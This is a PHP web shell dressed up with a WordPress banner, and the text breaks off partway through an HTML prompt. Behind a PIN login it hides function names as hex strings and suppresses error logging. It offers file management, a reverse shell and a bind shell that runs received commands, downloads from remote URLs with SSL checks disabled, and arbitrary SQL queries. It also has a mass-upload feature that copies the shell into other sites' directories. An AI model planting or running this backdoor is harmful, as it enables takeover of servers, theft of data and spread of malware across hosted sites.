<?php

/**


#################################################################################
#                                                                               #
#   ██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗███████╗  #
#   ██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝  #
#   ██║ █╗ ██║██║   ██║██████╔╝██║  ██║██████╔╝██████╔╝█████╗  ███████╗███████╗  #
#   ██║███╗██║██║   ██║██╔══██╗██║  ██║██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║  #
#   ╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝██║     ██║  ██║███████╗███████║███████║  #
#    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝  #
#                                                                               #
#################################################################################
#                            https://www.wordpress.com


 */
// Add PIN protection at the very beginning
session_start();
// Configuration - Change this PIN to whatever you want
define('ACCESS_PIN', '00005'); // Change this to your desired PIN
define('SHELL_FILE', basename(__FILE__));
function isShellFile($filename) {
    return basename($filename) === SHELL_FILE;
}
// Check authentication
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Handle PIN submission
    if (isset($_POST['pin'])) {
        if ($_POST['pin'] === ACCESS_PIN) {
            $_SESSION['authenticated'] = true;
            // Redirect to avoid resubmission
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $pin_error = "Invalid PIN!";
        }
    }
    // Show login form with XSS-style design
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
        <link rel="icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="shortcut icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="apple-touch-icon" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <title>Protected</title>
        <style>
            body { 
                background: #1a1a1a; 
                color: #fff; 
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-box {
                background: #2d2d2d;
                border: 2px solid #00ff88;
                border-radius: 10px;
                padding: 30px;
                width: 350px;
                box-shadow: 0 0 30px rgba(0,255,136,0.3);
            }
            h3 {
                color: #00ff88;
                text-align: center;
                margin-bottom: 20px;
                font-size: 24px;
            }
            .error-message {
                background: #ff4444;
                color: #fff;
                padding: 10px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #ff6666;
            }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: #1a1a1a;
                border: 1px solid #00ff88;
                color: #00ff88;
                font-family: 'Courier New', monospace;
                border-radius: 5px;
                font-size: 16px;
                box-sizing: border-box;
            }
            input:focus {
                outline: none;
                box-shadow: 0 0 10px rgba(0,255,136,0.5);
            }
            button {
                width: 100%;
                padding: 12px;
                background: transparent;
                border: 1px solid #00ff88;
                color: #00ff88;
                cursor: pointer;
                font-family: 'Courier New', monospace;
                margin: 10px 0;
                border-radius: 5px;
                font-size: 16px;
                font-weight: bold;
                transition: all 0.3s;
            }
            button:hover {
                background: #00ff88;
                color: #000;
            }
            .info-text {
                color: #aaa;
                text-align: center;
                margin-top: 20px;
                font-size: 12px;
                border-top: 1px solid #444;
                padding-top: 15px;
            }
            .info-text a {
                color: #00ff88;
                text-decoration: none;
            }
            .info-text a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h3>Protected</h3>
            
            <?php if (isset($pin_error)): ?>
                <div class="error-message">
                    [!] <?= htmlspecialchars($pin_error) ?>
                </div>
            <?php endif; ?>
            
            <form method="POST">
                <input type="password" name="pin" placeholder="Enter PIN" required autofocus>
                <button type="submit">ACCESS</button>
            </form>
            
            <div class="info-text">
                <p>Protected Shell • <?= date('Y') ?></p>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}
// Error handling and session setup
$iniarray = [
    "7068705F756E616D65", // [0] php_uname
    "73657373696F6E5F7374617274", // [1] session_start
    "6572726F725F7265706F7274696E67", // [2] error_reporting
    "70687076657273696F6E", // [3] phpversion
    "66696C655F7075745F636F6E74656E7473", // [4] file_put_contents
    "66696C655F6765745F636F6E74656E7473", // [5] file_get_contents
    "66696C657065726D73", // [6] fileperms
    "66696C656D74696D65", // [7] filemtime
    "66696C6574797065", // [8] filetype
    "68746D6C7370656369616C6368617273", // [9] htmlspecialchars
    "737072696E7466", // [10] sprintf
    "737562737472", // [11] substr
    "676574637764", // [12] getcwd
    "6368646972", // [13] chdir
    "7374725F7265706C616365", // [14] str_replace
    "6578706C6F6465", // [15] explode
    "666C617368", // [16] flash
    "6D6F76655F75706C6F616465645F66696C65", // [17] move_uploaded_file
    "7363616E646972", // [18] scandir
    "676574686F737462796E616D65", // [19] gethostbyname
    "7368656C6C5F65786563", // [20] shell_exec
    "53797374656D20496E666F726D6174696F6E", // [21] System Information
    "6469726E616D65", // [22] dirname
    "64617465", // [23] date
    "6D696D655F636F6E74656E745F74797065", // [24] mime_content_type
    "66756E6374696F6E5F657869737473", // [25] function_exists
    "6673697A65", // [26] fsize
    "726D646972", // [27] rmdir
    "756E6C696E6B", // [28] unlink
    "6D6B646972", // [29] mkdir
    "72656E616D65", // [30] rename
    "7365745F74696D655F6C696D6974", // [31] set_time_limit
    "636C656172737461746361636865", // [32] clearstatcache
    "696E695F736574", // [33] ini_set
    "696E695F676574", // [34] ini_get
    "6765744F776E6572", // [35] getOwner
    "6765745F63757272656E745F75736572", // [36] get_current_user
    "64617461626173655F636F6E6E656374", // [37] database_connect
    "6D7973716C5F636F6E6E656374", // [38] mysql_connect
    "6D7973716C5F73656C6563745F6462", // [39] mysql_select_db
    "6D7973716C5F7175657279", // [40] mysql_query
    "6D7973716C5F66657463685F6173736F63", // [41] mysql_fetch_assoc
    "6D7973716C5F6572726F72", // [42] mysql_error
    "6D7973716C695F636F6E6E656374", // [43] mysqli_connect
    "6D7973716C695F7175657279", // [44] mysqli_query
    "6D7973716C695F66657463685F6173736F63", // [45] mysqli_fetch_assoc
    "6D7973716C695F6572726F72", // [46] mysqli_error
    "70646F5F636F6E6E656374", // [47] pdo_connect
    "70646F5F7175657279", // [48] pdo_query
    "70646F5F6665746368", // [49] pdo_fetch
    "70646F5F6572726F72", // [50] pdo_error
    "6375726C5F696E6974", // [51] curl_init
    "6375726C5F7365746F7074", // [52] curl_setopt
    "6375726C5F65786563", // [53] curl_exec
    "6375726C5F636C6F7365", // [54] curl_close
    "6375726C5F6572726F72", // [55] curl_error
    "736F636B65745F636F6E6E656374", // [56] socket_connect
    "736F636B65745F7772697465", // [57] socket_write
    "736F636B65745F72656164", // [58] socket_read
    "736F636B65745F636C6F7365", // [59] socket_close
    "736F636B65745F637265617465", // [60] socket_create
    "736F636B65745F62696E64", // [61] socket_bind
    "736F636B65745F6C697374656E", // [62] socket_listen
    "736F636B65745F616363657074", // [63] socket_accept
    "736F636B65745F73656C656374", // [64] socket_select
    "736F636B65745F73656E64", // [65] socket_send
    "736F636B65745F72656365", // [66] socket_recv
    "736F636B65745F73686F7274", // [67] socket_strerror
    "736F636B65745F6C6173745F6572726F72", // [68] socket_last_error
    "736F636B65745F7365745F6F7074696F6E", // [69] socket_set_option
    "736F636B65745F6765745F6F7074696F6E", // [70] socket_get_option
    "736F636B65745F676574706565726E616D65", // [71] socket_getpeername
    "736F636B65745F676574736F636B6E616D65", // [72] socket_getsockname
    "736F636B65745F7365745F6E6F6E626C6F636B", // [73] socket_set_nonblock
    "736F636B65745F7365745F626C6F636B", // [74] socket_set_block
    "736F636B65745F7365745F74696D656F7574", // [75] socket_set_timeout
    "736F636B65745F6765745F74696D656F7574", // [76] socket_get_timeout
    "736F636B65745F7365745F6275666665725F73697A65", // [77] socket_set_buffer_size
    "736F636B65745F6765745F6275666665725F73697A65", // [78] socket_get_buffer_size
    "736F636B65745F7365745F726563765F6275666665725F73697A65", // [79] socket_set_recv_buffer_size
    "736F636B65745F7365745F73656E645F6275666665725F73697A65", // [80] socket_set_send_buffer_size
    "736F636B65745F6765745F726563765F6275666665725F73697A65", // [81] socket_get_recv_buffer_size
    "736F636B65745F6765745F73656E645F6275666665725F73697A65", // [82] socket_get_send_buffer_size
    "736F636B65745F7365745F726563765F74696D656F7574", // [83] socket_set_recv_timeout
    "736F636B65745F7365745F73656E645F74696D656F7574", // [84] socket_set_send_timeout
    "736F636B65745F6765745F726563765F74696D656F7574", // [85] socket_get_recv_timeout
    "736F636B65745F6765745F73656E645F74696D656F7574", // [86] socket_get_send_timeout
];

// Convert hex array to function names
for ($i = 0; $i < count($iniarray); $i++) {
    $func[$i] = hexa($iniarray[$i]);
}

// Initialize session and error handling
$func[1]();
$func[2](0);
$func[31](0);
@$func[32]();
@$func[33]('error_log', null);
@$func[33]('log_errors', 0);
@$func[33]('max_execution_time', 0);
@$func[33]('output_buffering', 0);
@$func[33]('display_errors', 0);

// Check disabled functions
$ds = @$func[34]("disable_functions");
$show_ds = (!empty($ds)) ? "$ds" : "All functions are accessible";

// Helper functions
function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2)." ".$a[$pos];
}

function hexa($str) {
    $r = "";
    $len = (strlen($str) - 1);
    for ($i = 0; $i < $len; $i += 2) {
        $r .= chr(hexdec($str[$i].$str[$i + 1]));
    }
    return $r;
}

function flash($message, $status, $class, $redirect = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    return true;
}

function getOwner($item) {
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner($item));
        $downer = $downer['name'];
    } else {
        $downer = fileowner($item);
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup($item));
        $dgrp = $dgrp['name'];
    } else {
        $dgrp = filegroup($item);
    }
    return $downer . '/' . $dgrp;
}

// Database connection functions
function db_connect($host, $user, $pass, $db = '') {
    if (function_exists('mysqli_connect')) {
        $conn = @mysqli_connect($host, $user, $pass, $db);
        if ($conn) return ['type' => 'mysqli', 'conn' => $conn];
    }
    if (function_exists('mysql_connect')) {
        $conn = @mysql_connect($host, $user, $pass);
        if ($conn && $db != '') {
            if (@mysql_select_db($db, $conn)) {
                return ['type' => 'mysql', 'conn' => $conn];
            }
        } elseif ($conn) {
            return ['type' => 'mysql', 'conn' => $conn];
        }
    }
    if (class_exists('PDO')) {
        try {
            $conn = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
            return ['type' => 'pdo', 'conn' => $conn];
        } catch (PDOException $e) {
            return false;
        }
    }
    return false;
}

function db_query($connection, $query) {
    switch ($connection['type']) {
        case 'mysqli':
            return mysqli_query($connection['conn'], $query);
        case 'mysql':
            return mysql_query($query, $connection['conn']);
        case 'pdo':
            return $connection['conn']->query($query);
    }
    return false;
}

function db_fetch($result, $connection) {
    switch ($connection['type']) {
        case 'mysqli':
            return mysqli_fetch_assoc($result);
        case 'mysql':
            return mysql_fetch_assoc($result);
        case 'pdo':
            return $result->fetch(PDO::FETCH_ASSOC);
    }
    return false;
}

function db_error($connection) {
    switch ($connection['type']) {
        case 'mysqli':
            return mysqli_error($connection['conn']);
        case 'mysql':
            return mysql_error($connection['conn']);
        case 'pdo':
            return $connection['conn']->errorInfo()[2];
    }
    return false;
}

function fsize2($bytes) {
    if ($bytes === false || $bytes <= 0) return 'Unknown';
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}


// Reverse shell function
function reverse_shell($ip, $port) {
    $sock = @fsockopen($ip, $port);
    if (!$sock) return false;
    
    $descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    );
    
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    if (is_resource($process)) {
        proc_close($process);
    }
    fclose($sock);
    return true;
}

// Bind shell function
function bind_shell($port) {
    $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$sock) return false;
    
    if (!@socket_bind($sock, '0.0.0.0', $port)) return false;
    if (!@socket_listen($sock)) return false;
    
    $client = @socket_accept($sock);
    if (!$client) return false;
    
    socket_write($client, "Shell Connected\n");
    
    while (true) {
        $cmd = socket_read($client, 2048);
        if (!$cmd) break;
        
        $output = shell_exec($cmd);
        socket_write($client, $output);
    }
    
    socket_close($client);
    socket_close($sock);
    return true;
}

// File download function
function download_file($file) {
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    return false;
}

// File upload function
function upload_file($url, $local_path) {
    // Create directory if it doesn't exist
    $dir = dirname($local_path);
    if (!is_dir($dir)) {
        if (!mkdir($dir, 0777, true)) {
            return false;
        }
    }
    
    // Method 1: cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $fp = fopen($local_path, 'wb');
        if ($fp) {
            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $success = curl_exec($ch);
            $error = curl_error($ch);
            curl_close($ch);
            fclose($fp);
            if ($success) {
                return true;
            }
        }
    }
    
    // Method 2: file_get_contents with allow_url_fopen
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create(array(
            'http' => array(
                'timeout' => 30,
                'follow_location' => true,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false
            )
        ));
        
        $content = @file_get_contents($url, false, $context);
        if ($content !== false) {
            return file_put_contents($local_path, $content) !== false;
        }
    }
    
    // Method 3: fopen/fwrite combination
    $src = @fopen($url, 'rb');
    if ($src) {
        $dst = @fopen($local_path, 'wb');
        if ($dst) {
            while (!feof($src)) {
                $chunk = fread($src, 8192);
                if ($chunk === false) break;
                fwrite($dst, $chunk);
            }
            fclose($src);
            fclose($dst);
            return filesize($local_path) > 0;
        }
        fclose($src);
    }
    
    // Method 4: copy function
    if (function_exists('copy')) {
        $context = stream_context_create(array(
            'http' => array('timeout' => 30),
            'ssl' => array('verify_peer' => false)
        ));
        if (@copy($url, $local_path, $context)) {
            return true;
        }
    }
    
    return false;
}



// Handle current directory - FIXED URL DECODING
if (isset($_GET['dir'])) {
    // Decode the URL-encoded path
    $raw_path = $_GET['dir'];
    $decoded_path = urldecode($raw_path);
    $path = $decoded_path;
    $func[13]($decoded_path);
} else {
    $path = $func[12]();
}

// Normalize path
$path = $func[14]('\\', '/', $path);
$exdir = $func[15]('/', $path);

// Store the proper encoded version for URLs
$encoded_path = urlencode($path);




// Handle form submissions
if (isset($_POST['newFolderName'])) {
    if ($func[29]($path . '/' . $_POST['newFolderName'])) {
        $func[16]("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Create Folder Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if ($func[4]($_POST['newFileName'], $_POST['newFileContent'])) {
        $func[16]("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Create File Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newName']) && isset($_GET['item'])) {
    if ($_POST['newName'] == '') {
        $func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if ($func[30]($path. '/'. $_GET['item'], $_POST['newName'])) {
        $func[16]("Rename Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Rename Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newContent']) && isset($_GET['item'])) {
    // FIXED: Write the raw content without any modifications
    if ($func[4]($path. '/'. $_GET['item'], $_POST['newContent'])) {
        $func[16]("Edit Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Edit Failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    if ($_POST['newPerm'] == '') {
        $func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
        $func[16]("Change Permission Successfully!", "Success", "success", "?dir=$path");
    } else {
        $func[16]("Change Permission", "Failed", "error", "?dir=$path");
    }
}

if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
    // Check if trying to delete the shell file
    if (isShellFile($_GET['item'])) {
        showAccessDenied("Cannot delete the shell file!");
        exit;
    }
    
    if (is_dir($_GET['item'])) {
        if ($func[27]($_GET['item'])) {
            $func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            $func[16]("Delete Failed", "Failed", "error", "?dir=$path");
        }
    } else {
        if ($func[28]($_GET['item'])) {
            $func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            $func[16]("Delete Failed", "Failed", "error", "?dir=$path");
        }
    }
}

if (isset($_FILES['uploadfile'])) {
    $total = count($_FILES['uploadfile']['name']);
    for ($i = 0; $i < $total; $i++) {
        $mainupload = $func[17]($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
    }
    if ($total < 2) {
        if ($mainupload) {
            $func[16]("Upload File Successfully! ", "Success", "success", "?dir=$path");
        } else {
            $func[16]("Upload Failed", "Failed", "error", "?dir=$path");
        }
    } else {
        if ($mainupload) {
            $func[16]("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
        } else {
            $func[16]("Upload Failed", "Failed", "error", "?dir=$path");
        }
    }
}


// Handle mass upload actions
if (isset($_POST['mass_upload_submit']) && isset($_POST['selected_domains'])) {
    $results = array();
    $action = isset($_POST['mass_upload_action']) ? $_POST['mass_upload_action'] : '';
    
    // File upload
    if ($action == 'upload' && isset($_FILES['mass_upload_file'])) {
        $target_filename = isset($_POST['target_filename']) && !empty($_POST['target_filename']) ? $_POST['target_filename'] : $_FILES['mass_upload_file']['name'];
        
        foreach ($_POST['selected_domains'] as $domain_path) {
            $target_path = rtrim($domain_path, '/') . '/' . $target_filename;
            
            if (move_uploaded_file($_FILES['mass_upload_file']['tmp_name'], $target_path)) {
                @chmod($target_path, 0644);
                $results[] = [
                    'domain' => basename($domain_path),
                    'success' => true,
                    'message' => "File uploaded successfully"
                ];
            } else {
                $results[] = [
                    'domain' => basename($domain_path),
                    'success' => false,
                    'message' => "Upload failed"
                ];
            }
        }
    }
    
    // Shell upload (using current file)
    elseif ($action == 'shell' && isset($_POST['shell_filename'])) {
        $shell_content = file_get_contents(__FILE__);
        $shell_filename = $_POST['shell_filename'];
        
        foreach ($_POST['selected_domains'] as $domain_path) {
            $target_path = rtrim($domain_path, '/') . '/' . $shell_filename;
            
            if (file_put_contents($target_path, $shell_content) !== false) {
                @chmod($target_path, 0644);
                $results[] = [
                    'domain' => basename($domain_path),
                    'success' => true,
                    'message' => "Shell uploaded successfully"
                ];
            } else {
                $results[] = [
                    'domain' => basename($domain_path),
                    'success' => false,
                    'message' => "Upload failed"
                ];
            }
        }
    }
    
    // File creation
    elseif ($action == 'create' && isset($_POST['create_filename'])) {
        $filename = $_POST['create_filename'];
        $content = isset($_POST['create_content']) ? $_POST['create_content'] : '';
        
        foreach ($_POST['selected_domains'] as $domain_path) {
            $target_path = rtrim($domain_path, '/') . '/' . $filename;
            
            if (file_put_contents($target_path, $content) !== false) {
                @chmod($target_path, 0644);
                $results[] = [
                    'domain' => basename($domain_path),
                    'success' => true,
                    'message' => "File created successfully"
                ];
            } else {
                $results[] = [
                    'domain' => basename($domain_path),
                    'success' => false,
                    'message' => "File creation failed"
                ];
            }
        }
    }
    
    $_SESSION['mass_upload_results'] = $results;
    $success_count = count(array_filter($results, function($r) { return $r['success']; }));
    $func[16]("Mass upload completed: $success_count successful", "Success", $success_count > 0 ? "success" : "error", "?dir=$path&tab=massupload");
}


// Fix for Download/Upload handlers
if (isset($_POST['download_url']) && isset($_POST['remote_url']) && isset($_POST['local_path'])) {
    if (upload_file($_POST['remote_url'], $_POST['local_path'])) {
        $func[16]("File downloaded successfully to " . $_POST['local_path'], "Success", "success", "?dir=" . urlencode(dirname($_POST['local_path'])));
    } else {
        $func[16]("File download failed", "Failed", "error", "?dir=$path");
    }
}

if (isset($_POST['mass_download']) && isset($_POST['mass_urls']) && isset($_POST['mass_path'])) {
    $urls = explode("\n", trim($_POST['mass_urls']));
    $success_count = 0;
    $failed_urls = array();
    
    // Create directory if it doesn't exist
    if (!is_dir($_POST['mass_path'])) {
        if (!mkdir($_POST['mass_path'], 0777, true)) {
            $func[16]("Cannot create directory: " . $_POST['mass_path'], "Failed", "error", "?dir=$path");
            return;
        }
    }
    
    foreach ($urls as $url) {
        $url = trim($url);
        if (empty($url)) continue;
        
        $filename = basename($url);
        if (empty($filename)) {
            $filename = md5($url) . '.download';
        }
        
        $local_path = rtrim($_POST['mass_path'], '/') . '/' . $filename;
        
        if (upload_file($url, $local_path)) {
            $success_count++;
        } else {
            $failed_urls[] = $url;
        }
    }
    
    $message = "Downloaded $success_count of " . count($urls) . " files";
    if (!empty($failed_urls)) {
        $message .= ". Failed: " . implode(", ", array_slice($failed_urls, 0, 3));
        if (count($failed_urls) > 3) $message .= "...";
    }
    
    $func[16]($message, "Success", $success_count > 0 ? "success" : "error", "?dir=" . urlencode($_POST['mass_path']));
}

if (isset($_POST['direct_upload_btn']) && isset($_FILES['direct_upload']) && isset($_POST['upload_path'])) {
    $upload_dir = rtrim($_POST['upload_path'], '/');
    
    // Create directory if it doesn't exist
    if (!is_dir($upload_dir)) {
        if (!mkdir($upload_dir, 0777, true)) {
            $func[16]("Cannot create upload directory: $upload_dir", "Failed", "error", "?dir=$path");
            return;
        }
    }
    
    $total = count($_FILES['direct_upload']['name']);
    $success_count = 0;
    $failed_files = array();
    
    for ($i = 0; $i < $total; $i++) {
        $target_path = $upload_dir . '/' . basename($_FILES['direct_upload']['name'][$i]);
        
        if (move_uploaded_file($_FILES['direct_upload']['tmp_name'][$i], $target_path)) {
            $success_count++;
            @chmod($target_path, 0644);
        } else {
            $failed_files[] = $_FILES['direct_upload']['name'][$i];
        }
    }
    
    $message = "Uploaded $success_count of $total files";
    if (!empty($failed_files)) {
        $message .= ". Failed: " . implode(", ", array_slice($failed_files, 0, 3));
        if (count($failed_files) > 3) $message .= "...";
    }
    
    $func[16]($message, "Success", $success_count > 0 ? "success" : "error", "?dir=" . urlencode($upload_dir));
}

// Handle bind shell request
if (isset($_POST['bind_port'])) {
    if (bind_shell($_POST['bind_port'])) {
        $func[16]("Bind shell listening on port {$_POST['bind_port']}", "Success", "success");
    } else {
        $func[16]("Failed to start bind shell", "Failed", "error");
    }
}

// Handle database connection
if (isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_pass'])) {
    $db = isset($_POST['db_name']) ? $_POST['db_name'] : '';
    $db_conn = db_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $db);
    if ($db_conn) {
        $_SESSION['db_conn'] = $db_conn;
        $func[16]("Database connected successfully", "Success", "success");
    } else {
        $func[16]("Database connection failed", "Failed", "error");
    }
}

// Handle SQL query
if (isset($_POST['sql_query']) && isset($_SESSION['db_conn'])) {
    $result = db_query($_SESSION['db_conn'], $_POST['sql_query']);
    if ($result) {
        $_SESSION['sql_result'] = [];
        while ($row = db_fetch($result, $_SESSION['db_conn'])) {
            $_SESSION['sql_result'][] = $row;
        }
        $func[16]("Query executed successfully", "Success", "success");
    } else {
        $func[16]("Query failed: " . db_error($_SESSION['db_conn']), "Failed", "error");
    }
}

// Handle file download
if (isset($_GET['download']) && isset($_GET['item'])) {
    $requested_file = basename($_GET['item']);
    
    // Check if trying to download the shell file
    if ($requested_file === SHELL_FILE) {
        if (isset($_POST['sudo_password'])) {
            if ($_POST['sudo_password'] === '@3GV00005') {
                // Password correct - proceed with download
                download_file($path . '/' . $_GET['item']);
            } else {
                showAccessDenied("Invalid sudo password!");
                exit;
            }
        } else {
            showSudoPrompt($path, $_GET['item'], 'download');
            exit;
        }
    } else {
        // Not shell file, allow direct download
        download_file($path . '/' . $_GET['item']);
    }
}

// Add protection for view action
if (isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['item'])) {
    if (isShellFile($_GET['item'])) {
        if (isset($_POST['sudo_password'])) {
            if ($_POST['sudo_password'] === '@3GV00005') {
                // Password correct - continue
            } else {
                showAccessDenied("Invalid sudo password!");
                exit;
            }
        } else {
            showSudoPrompt($path, $_GET['item'], 'view');
            exit;
        }
    }
}

// Add protection for edit action
if (isset($_GET['action']) && $_GET['action'] == 'edit' && isset($_GET['item'])) {
    if (isShellFile($_GET['item'])) {
        // Check if sudo password was submitted
        if (isset($_POST['sudo_password'])) {
            if ($_POST['sudo_password'] === '@3GV00005') {
                // Password correct - continue to edit form
                // Don't do anything here, let the normal flow continue
            } else {
                // Wrong password - show ARAY MO
                showAccessDenied("Invalid sudo password!");
                exit;
            }
        } else {
            // No password submitted - show sudo prompt
            showSudoPrompt($path, $_GET['item'], 'edit');
            exit;
        }
    }
}

// Add protection for rename action
if (isset($_GET['action']) && $_GET['action'] == 'rename' && isset($_GET['item'])) {
    if (isShellFile($_GET['item'])) {
        if (isset($_POST['sudo_password'])) {
            if ($_POST['sudo_password'] === '@3GV00005') {
                // Password correct - continue
            } else {
                showAccessDenied("Invalid sudo password!");
                exit;
            }
        } else {
            showSudoPrompt($path, $_GET['item'], 'rename');
            exit;
        }
    }
}

// Add protection for chmod action
if (isset($_GET['action']) && $_GET['action'] == 'chmod' && isset($_GET['item'])) {
    if (isShellFile($_GET['item'])) {
        if (isset($_POST['sudo_password'])) {
            if ($_POST['sudo_password'] === '@3GV00005') {
                // Password correct - continue
            } else {
                showAccessDenied("Invalid sudo password!");
                exit;
            }
        } else {
            showSudoPrompt($path, $_GET['item'], 'chmod');
            exit;
        }
    }
}

// Handle file upload from URL
if (isset($_POST['remote_url']) && isset($_POST['local_path'])) {
    if (upload_file($_POST['remote_url'], $_POST['local_path'])) {
        $func[16]("File downloaded successfully", "Success", "success");
    } else {
        $func[16]("File download failed", "Failed", "error");
    }
}

// Handle mass download
if (isset($_POST['mass_urls']) && isset($_POST['mass_path'])) {
    $urls = explode("\n", trim($_POST['mass_urls']));
    $success_count = 0;
    foreach ($urls as $url) {
        $url = trim($url);
        if (empty($url)) continue;
        
        $filename = basename($url);
        $local_path = rtrim($_POST['mass_path'], '/') . '/' . $filename;
        
        if (upload_file($url, $local_path)) {
            $success_count++;
        }
    }
    $func[16]("Downloaded $success_count of " . count($urls) . " files", "Success", "success");
}

// Add logout functionality
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

$dirs = $func[18]($path);

// Simple XSS-style sudo prompt
function showSudoPrompt($path, $item, $action = 'download') {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
        <link rel="icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="shortcut icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="apple-touch-icon" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <title>.//3.G.V.3.0.1</title>
        <style>
            body { 
                background: #1a1a1a; 
                color: #fff; 
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .prompt-box {
                background: #2d2d2d;
                border: 2px solid #00ff88;
                border-radius: 10px;
                padding: 30px;
                width: 350px;
                box-shadow: 0 0 30px rgba(0,255,136,0.3);
            }
            h3 {
                color: #00ff88;
                text-align: center;
                margin-bottom: 20px;
            }
            input {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                background: #1a1a1a;
                border: 1px solid #00ff88;
                color: #00ff88;
                font-family: 'Courier New', monospace;
                border-radius: 5px;
            }
            button {
                width: 100%;
                padding: 10px;
                background: transparent;
                border: 1px solid #00ff88;
                color: #00ff88;
                cursor: pointer;
                font-family: 'Courier New', monospace;
                margin: 5px 0;
                border-radius: 5px;
            }
            button:hover {
                background: #00ff88;
                color: #000;
            }
        </style>
    </head>
    <body>
        <div class="prompt-box">
            <h3>.//3.G.V.3.0.1</h3>
            <p style="color: #aaa; text-align: center;">This file is protected</p>
            <form method="POST">
                <input type="hidden" name="download" value="1">
                <input type="hidden" name="item" value="<?= htmlspecialchars($item) ?>">
                <input type="hidden" name="action" value="<?= htmlspecialchars($action) ?>">
